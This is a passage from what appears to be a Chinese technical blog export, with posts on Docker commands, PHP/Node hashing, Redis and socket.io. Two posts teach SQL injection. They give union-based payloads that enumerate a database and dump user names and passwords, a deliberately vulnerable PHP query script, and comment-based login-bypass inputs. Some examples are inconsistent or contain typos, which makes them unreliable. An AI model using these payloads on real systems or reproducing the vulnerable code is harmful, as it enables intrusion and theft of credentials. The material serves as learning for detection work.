plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave</span><br></pre></td></tr></table></figure><p>强制离开并关掉集群</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker swarm leave -f</span><br></pre></td></tr></table></figure><p>查看该节点的详情信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker node inspect &lt;node ID&gt;</span><br></pre></td></tr></table></figure><p>部署应用程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker stack deploy -c &lt;file&gt; &lt;app&gt;</span><br></pre></td></tr></table></figure><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><p>查看Docker版本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker version</span><br></pre></td></tr></table></figure><p>显示Docker系统信息，包括镜像和容器数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker info</span><br></pre></td></tr></table></figure><p>查看Docker 容器的配置和状态信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker inspect mydocker</span><br><span class="line"># 表示容器的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看指定容器映射到宿主机的端口号。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker port mydocker</span><br><span class="line">80&#x2F;tcp -&gt; 0.0.0.0:4000</span><br><span class="line"># mydocker 表示该应用的Container ID 或者Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker logs -f mydocker </span><br><span class="line"> * Running on http:&#x2F;&#x2F;0.0.0.0:80&#x2F; (Press CTRL+C to quit)</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:34] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line">113.87.130.57 - - [01&#x2F;Apr&#x2F;2019 12:58:35] &quot;GET &#x2F; HTTP&#x2F;1.1&quot; 200 -</span><br><span class="line"># mydocker 表示该应用的Container ID 或者是Names</span><br></pre></td></tr></table></figure><p>查看Web 应用程序容器的进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ docker top mydocker </span><br><span class="line"># </span><br><span class="line">UID        PID       PPID        C     STIME        TTY         TIME                CMD</span><br><span class="line">root      22358      22323       0     20:58        ?      00:00:00            python app.py</span><br></pre></td></tr></table></figure><h2 id="杂项-1"><a href="#杂项-1" class="headerlink" title="杂项"></a>杂项</h2><h3 id="容器有哪些网络模式"><a href="#容器有哪些网络模式" class="headerlink" title="容器有哪些网络模式"></a>容器有哪些网络模式</h3><h5 id="1-None"><a href="#1-None" class="headerlink" title="1. None"></a>1. None</h5><p>在该模式下容器没有对外网络，本地机只有一个回路地址</p><h5 id="2-Container"><a href="#2-Container" class="headerlink" title="2. Container"></a>2. Container</h5><p>在该模式下，与另一个容器共享网络</p><h5 id="3-Host"><a href="#3-Host" class="headerlink" title="3. Host"></a>3. Host</h5><p>在该模式下，与主机共享网络</p><h5 id="4-Bridge"><a href="#4-Bridge" class="headerlink" title="4. Bridge"></a>4. Bridge</h5><p>该模式为Docker 默认的网络模式，在这种模式下，Docker 容器与外部的通信都是通过 iptable 实现的。</p><h5 id="5-Overlay"><a href="#5-Overlay" class="headerlink" title="5. Overlay"></a>5. Overlay</h5><p>该模式为Docker 目前原生的跨主机多子网模型，主要是通过 vxlan 技术实现。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="http://www.ruanyifeng.com/blog/2018/02/docker-tutorial.html" target="_blank" rel="noopener">Docker 入门教程 - 阮一峰网络日志</a></li><li><a href="wiki.jikexueyuan.com/project/docker-technology-and-combat">Docker 入门 - 极客学院</a></li><li><a href="https://docs.docker.com/install/" target="_blank" rel="noopener">安装Docker ce - 官方文档</a></li><li><a href="http://www.ityouknow.com/docker/2018/04/19/docker-swarm.html" target="_blank" rel="noopener">Docker Swarm 入门教程</a></li><li><a href="http://www.runoob.com/docker/ubuntu-docker-install.html" target="_blank" rel="noopener">如何在Ubuntu 18.4上安装 Docker-ce</a></li><li><a href="https://docs.docker.com/machine/install-machine/" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装Docker Machine</a></li><li><a href="https://linuxize.com/post/how-to-install-virtualbox-on-ubuntu-18-04/#disqus_thread" target="_blank" rel="noopener">如何在Ubuntu 18.04上安装VirtualBox</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Tutorial </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tutorial </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP 中使用 hash_hmac 加密</title>
      <link href="/php-uses-hash-hmac-encryption/"/>
      <url>/php-uses-hash-hmac-encryption/</url>
      
        <content type="html"><![CDATA[<p>今天做项目时，遇到一个问题，需要将一段哈希值按照某种规则进行加密。源码是用<code>Node</code>写的，需要翻译成<code>PHP</code> 版本的。</p><a id="more"></a><h3 id="PHP中使用-Hmac-方法生成带有密钥的哈希值"><a href="#PHP中使用-Hmac-方法生成带有密钥的哈希值" class="headerlink" title="PHP中使用 Hmac 方法生成带有密钥的哈希值"></a>PHP中使用 Hmac 方法生成带有密钥的哈希值</h3><p>在Node.js 中，这是一段用于生成“加盐”的哈希值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var crypto &#x3D; require(&#39;crypto&#39;);</span><br><span class="line"></span><br><span class="line">var secret &#x3D; &quot;122410&quot;</span><br><span class="line">var key &#x3D; &quot;key&quot;</span><br><span class="line">var hash &#x3D; crypto.createHmac(&#39;sha256&#39;, secret).update(key).digest(&#39;hex&#39;)</span><br><span class="line"></span><br><span class="line">console.log(hash);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><p>如果要翻译成PHP版本，其实非常简单，直接使用PHP 的 <code>hash_hmac</code>函数就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$secret &#x3D; &quot;122410&quot;; </span><br><span class="line">$key &#x3D; &quot;key&quot;;</span><br><span class="line">echo hash_hmac(&quot;sha256&quot;, $key, $secret);</span><br><span class="line">&#x2F;&#x2F; dcc9ddf4836d4ecb6bd12fccc983207f39cfb84c43c01932eee22357cf0567b4</span><br></pre></td></tr></table></figure><h4 id="将密钥设置成二进制"><a href="#将密钥设置成二进制" class="headerlink" title="将密钥设置成二进制"></a>将密钥设置成二进制</h4><p>如果需要加密的部分，并不是普通的字符串，而是二进制字符串，那么需要使用<code>pack</code>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 5e50e6458b0cdc7ee534967d113a9deffe6740d0</span><br><span class="line">&#x2F;&#x2F; 预期结果：46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><p>先将十六进制字符串转换为二进制数据，然后再将其传递给<code>hash_hmac</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var_dump(hash_hmac(&quot;sha1&quot;, &quot;office:fred&quot;, pack(&quot;H*&quot;, &quot;AA381AC5E4298C23B3B3333333333333333333&quot;)));</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 46abe81345b1da2f1a330bba3d6254e110cd9ad8</span><br></pre></td></tr></table></figure><h3 id="Node中使用crypto进行md5-加密"><a href="#Node中使用crypto进行md5-加密" class="headerlink" title="Node中使用crypto进行md5 加密"></a>Node中使用crypto进行md5 加密</h3><p>在PHP 中，如果需要获取某个字符串的md5 加密之后的哈希值，非常简单，直接使用<code>md5</code> 函数即可。</p><p>但是在<code>node.js</code> 中，并没有为我们直接提供这样的函数，所以需要手动调用<code>crypto</code> 模块去转换：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var pwd &#x3D; &quot;122410&quot;;</span><br><span class="line">var hash &#x3D; crypto.createHash(&#39;md5&#39;).update(pwd).digest(&#39;hex&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 913975c2f972ba6bbf5ba593c68a5dc5</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://stackoverflow.com/questions/13012239/how-to-set-the-hmacsha1-key-to-hex-in-php" target="_blank" rel="noopener">如何在PHP中将hmac sha1密钥设置为十六进制？</a></li><li><a href="https://caligatio.github.io/jsSHA/" target="_blank" rel="noopener">在线转换工具</a></li><li><a href="https://www.php.net/manual/zh/function.hash-hmac.php" target="_blank" rel="noopener">php hash_hmac 函数</a></li><li><a href="http://nodejs.cn/api/crypto.html" target="_blank" rel="noopener">node.js crypto 模块</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> Node </tag>
            
            <tag> Hash </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整理常见的 SQL 注入语句</title>
      <link href="/organize-common-sql-injection-statements/"/>
      <url>/organize-common-sql-injection-statements/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记的目的是整理各种 SQL 注入使用时的<code>payload</code>。</p><a id="more"></a><blockquote><p>说明：以下的<code>payloads</code>都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。</p></blockquote><p>也就是基于这样一种情况：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;;</span><br></pre></td></tr></table></figure><h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><ol><li>判断当前数据表中有几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;1&#39; order by 数值 --+</span><br></pre></td></tr></table></figure><ol start="2"><li>查看显示位在第几列：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,3 --+</span><br></pre></td></tr></table></figure><blockquote><p>注意：这里需要传递一个不存在的条件，比如：<code>id=-1</code></p></blockquote><ol start="3"><li>显示当前数据库（假设显示位中包含第三位）：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,database() --+</span><br></pre></td></tr></table></figure><ol start="4"><li>查看当前数据库中的所有表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()) --+</span><br></pre></td></tr></table></figure><blockquote><p>函数<code>group_concat()</code>把所有结果都在一行输出</p></blockquote><ol start="5"><li>查询所有数据库：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+</span><br></pre></td></tr></table></figure><ol start="6"><li>查询某个数据库中的表：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+</span><br></pre></td></tr></table></figure><ol start="7"><li><p>查询某个表中的所有字段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; --+</span><br></pre></td></tr></table></figure></li><li><p>查询某个表中的字段内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1&#39; union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)</span><br></pre></td></tr></table></figure><blockquote><p>0x3a会被转义位冒号<code>：</code></p></blockquote></li></ol><h3 id="Union"><a href="#Union" class="headerlink" title="Union"></a>Union</h3><p>SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Web安全学习之数据库注入语句的收集和学习</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Web 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识SQL 注入常见方式</title>
      <link href="/know-common-ways-of-sql-injection/"/>
      <url>/know-common-ways-of-sql-injection/</url>
      
        <content type="html"><![CDATA[<p>最近需要做一个检测<code>SQL 注入</code>的功能，无奈发现自己于对<code>SQL 注入</code>竟有点陌生，本着搞清楚原理才能更好的理解Bug 产生的原因，于是便有了这篇笔记。</p><a id="more"></a><h2 id="SQL-注入是什么？"><a href="#SQL-注入是什么？" class="headerlink" title="SQL 注入是什么？"></a>SQL 注入是什么？</h2><p>SQL 注入是一种将SQL 语句添加到REQUEST 参数中，传递到服务器并执行的一种攻击手段。</p><p>SQL 注入攻击是REQUEST 引數未经过过滤，然后直接拼接到SQL 语句中，解析并执行，而达到预想之外的一种行为。</p><h2 id="SQL-注入是怎样产生的"><a href="#SQL-注入是怎样产生的" class="headerlink" title="SQL 注入是怎样产生的"></a>SQL 注入是怎样产生的</h2><ol><li>WEB 开发人员无法保证所有的输入都已经完美过滤。</li><li>数据库未做安全配置，存在安全隐患。</li></ol><h2 id="如何进行SQL-注入"><a href="#如何进行SQL-注入" class="headerlink" title="如何进行SQL 注入"></a>如何进行SQL 注入</h2><p>这里以<code>PHP</code>、<code>Mysql</code>为例，介绍一下完整的SQL 注入攻击是如何产生的。</p><h3 id="回显注入"><a href="#回显注入" class="headerlink" title="回显注入"></a>回显注入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$db_host &#x3D; &quot;localhost&quot;;</span><br><span class="line">$db_user &#x3D; &quot;root&quot;;</span><br><span class="line">$db_pwd &#x3D; xxxxxx;</span><br><span class="line">$db_name &#x3D; &quot;User&quot;;</span><br><span class="line">$db_table &#x3D; &quot;Student&quot;;</span><br><span class="line"></span><br><span class="line">echo &#39;&lt;h1&gt;&#39;;</span><br><span class="line">echo &#39;Test ErrorBased Injections&#39;;</span><br><span class="line">echo &#39;&lt;&#x2F;h1&gt;&#39;;</span><br><span class="line">error_reporting(E_ALL ^ E_DEPRECATED);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 测试连接</span><br><span class="line">$conn &#x3D; mysqli_connect($db_host, $db_user, $db_pwd);</span><br><span class="line">if (!$conn)&#123;</span><br><span class="line">    echo &#39;Mysql 连接失败:&#39;.mysqli_error($conn);</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    echo &#39;Mysql 连接成功&#39;;</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;连接数据库</span><br><span class="line">mysqli_select_db($conn, $db_name) or die (&quot;无法连接到数据库: &quot;.$db_name);</span><br><span class="line">mysqli_query($conn, &#39;set names utf-8&#39;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 获取参数</span><br><span class="line">if(isset($_GET[&#39;id&#39;]))&#123;</span><br><span class="line">    $id&#x3D;$_GET[&#39;id&#39;];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 拼接SQL语句</span><br><span class="line">$sql&#x3D; &quot;SELECT * FROM $db_table WHERE id &#x3D; &#123;$id&#125; &quot;;</span><br><span class="line">echo &#39;查询SQL 语句:&#39;.$sql;</span><br><span class="line">echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;执行</span><br><span class="line">$result&#x3D;mysqli_query($conn, $sql);</span><br><span class="line">$row&#x3D;mysqli_fetch_array($result, MYSQLI_BOTH);</span><br><span class="line">if($row) &#123;</span><br><span class="line">  echo &#39;Your Login name:&#39;.$row[&#39;username&#39;];</span><br><span class="line">  echo &#39;&lt;hr&gt;&#39;;</span><br><span class="line">  echo &#39;Your Password:&#39;.$row[&#39;password&#39;];</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>调用地址是<code>http://127.0.0.1/sqli.php?id=1</code>，使用<code>GET</code>传入参数<code>id</code>，输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; &#39;1&#39;</span><br></pre></td></tr></table></figure><p>正常情况下，会返回<code>id = 1</code> 的学生信息。</p><h4 id="1-数字注入"><a href="#1-数字注入" class="headerlink" title="1. 数字注入"></a>1. 数字注入</h4><p>如果在浏览器中输入：<code>http://127.0.0./sqli.php?id=1&#39; union select 1,2--+</code>会怎样呢？输出的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE id &#x3D; -1 or 1&#x3D;1</span><br></pre></td></tr></table></figure><p>这会导致所有的学生信息都被输出了，为什么会这样呢？这是因为<code>id = -1</code>是一个不存在的条件，而<code>1 = 1</code>却是一个永远存在的条件，这就相当于没有加 Where 条件。</p><h4 id="2-字符串注入"><a href="#2-字符串注入" class="headerlink" title="2. 字符串注入"></a>2. 字符串注入</h4><p>现在有这样一种场景：<code>http://127.0.0./login.php</code>模拟用户登录。假设正确的用户名和密码是<code>Boo</code>、<code>122410</code>，那么在正常的登录情况下所执行的SQL 语句如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39; ADN password &#x3D; &#39;122410&#39;</span><br></pre></td></tr></table></figure><p>由于用户名和密码都是字符串，所以SQL 注入会把参数携带的数据变成<code>Mysql</code>中的注释。Mysql 中的注释有两种。</p><h4 id="1"><a href="#1" class="headerlink" title="1. #"></a>1. <code>#</code></h4><p>假设<code>POST</code> 传递的参数分别是：<code>username = Boo&#39;#</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;#&#39;ADN password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>#</code>号 后的所有字符串都会被当成注释来处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><h4 id="2"><a href="#2" class="headerlink" title="2. --"></a>2. <code>--</code></h4><p>假设<code>POST</code>请求传递的参数分别是：<code>username = Boo&#39;--</code>、<code>password = xxxxxx</code>，那么产生的SQL 语句则是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;-- &#39;AND password &#x3D; &#39;xxxxxx&#39;</span><br></pre></td></tr></table></figure><p>因为<code>--</code>号 后面的所有内容都会被当成注释处理，所以上面的SQL 语句等价于：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM Student WHERE username &#x3D; &#39;Boo&#39;</span><br></pre></td></tr></table></figure><p>无论是上面的哪一种情况，攻击者都能在不知道具体密码的情况下而成功登录。</p><p>这大概就是一个简单的SQL注入产生的完整过程了，这里只是抛砖引玉的介绍了下原理，而实际场景中的SQL 注入当然远远不止这两种。</p><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.csdn.net/github_36032947/article/details/78442189" target="_blank" rel="noopener">SQL 注入常见方式以及检测方法</a></p>]]></content>
      
      
      <categories>
          
          <category> Mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Mysql </tag>
            
            <tag> Web 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis 常见事件整理</title>
      <link href="/redis-common-events-collation/"/>
      <url>/redis-common-events-collation/</url>
      
        <content type="html"><![CDATA[<p>这篇笔记用来整理 Redis 的常用事件。</p><a id="more"></a><h2 id="客户端事件"><a href="#客户端事件" class="headerlink" title="客户端事件"></a>客户端事件</h2><p>客户端会发出一些事件的状态连接到Redis 服务器。</p><h3 id="Ready"><a href="#Ready" class="headerlink" title="Ready"></a>Ready</h3><h3 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h3><p>客户端连接Redis 时，如果出现异常，则会触发Error 事件。</p><h3 id="Connect"><a href="#Connect" class="headerlink" title="Connect"></a>Connect</h3><p>客户端连接至Redis 时，会触发连接事件。</p><h2 id="订阅者事件"><a href="#订阅者事件" class="headerlink" title="订阅者事件"></a>订阅者事件</h2><h3 id="Message"><a href="#Message" class="headerlink" title="Message"></a>Message</h3><p>将接收到来自订阅频道的消息，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;message&quot;, function (channel, message) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h3 id="Subscribe"><a href="#Subscribe" class="headerlink" title="Subscribe"></a>Subscribe</h3><p>监听订阅事件，返回订阅频道的订阅数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">client.on(&quot;subscribe&quot;, function (channel, count) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="发布-订阅"><a href="#发布-订阅" class="headerlink" title="发布/订阅"></a>发布/订阅</h2><h3 id="Publish"><a href="#Publish" class="headerlink" title="Publish"></a>Publish</h3><p>将信息 <code>message</code> 发送到指定的频道 <code>channel</code> 。</p><p>返回值：接收到信息 <code>message</code> 的订阅者数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PUBLISH channel message</span><br></pre></td></tr></table></figure><h3 id="SUBSCRIBE"><a href="#SUBSCRIBE" class="headerlink" title="SUBSCRIBE"></a>SUBSCRIBE</h3><p>订阅给定频道的信息。</p><p>返回值：接收到的信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SUBSCRIBE channel [channel ...]</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://redis.readthedocs.io/en/2.4/index.html" target="_blank" rel="noopener">Redis命令参考简体中文版</a></li><li><a href="https://github.com/NodeRedis/node-redis" target="_blank" rel="noopener">A high performance Node.js Redis client</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Socket.io 快速上手</title>
      <link href="/socket-io-quick-start/"/>
      <url>/socket-io-quick-start/</url>
      
        <content type="html"><![CDATA[<p>最近使用<code>socket.io</code> 和 <code>redis</code> 完成了一些小功能，觉得很实用，所以整理一下<code>socket.io</code>相关的知识。</p><a id="more"></a><h1 id="socket-io-是什么"><a href="#socket-io-是什么" class="headerlink" title="socket.io 是什么"></a><code>socket.io</code> 是什么</h1><p>它是一个服务端与客户端之间建立通讯的工具。</p><p>服务端创建好服务之后，客户端通过主机与之建立连接。然后就可以进行通讯了。</p><p>想要使用好<code>socket.io</code>，一定要理解通讯的概念。通讯一定是双向的，如果客户端能够收到消息，那么在某个地方就一定存在服务端向客户端推送消息。</p><h2 id="快速上手"><a href="#快速上手" class="headerlink" title="快速上手"></a>快速上手</h2><p>要开始使用<code>socket.io</code>进行开发，需要先安装Node和npm。</p><p>创建一个名为<code>app.js</code>的文件，并添加以下代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">var app &#x3D; require(&#39;express&#39;)();</span><br><span class="line">var http &#x3D; require(&#39;http&#39;).Server(app);</span><br><span class="line">&#x2F;&#x2F; 创建一个附加到http服务器的新socket.io实例</span><br><span class="line">var io &#x3D; require(&#39;socket.io&#39;)(http);</span><br><span class="line"></span><br><span class="line">app.get(&#39;&#x2F;&#39;, function(req, res)&#123;</span><br><span class="line">  res.sendFile(__dirname + &#39;&#x2F;index.html&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">io.on(&#39;connection&#39;, function(socket)&#123;</span><br><span class="line">  console.log(&#39;a user connected&#39;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">http.listen(3000, function()&#123;</span><br><span class="line">  console.log(&#39;listening on *:3000&#39;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这样就完成了一个最简单的<code>socket</code>服务端。</p><p>创建<code>index.html</code> 文件来作为客户端提供服务。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">   &lt;head&gt;</span><br><span class="line">      &lt;title&gt;Hello world&lt;&#x2F;title&gt;</span><br><span class="line">   &lt;&#x2F;head&gt;</span><br><span class="line">   &lt;body&gt;Hello world&lt;&#x2F;body&gt;</span><br><span 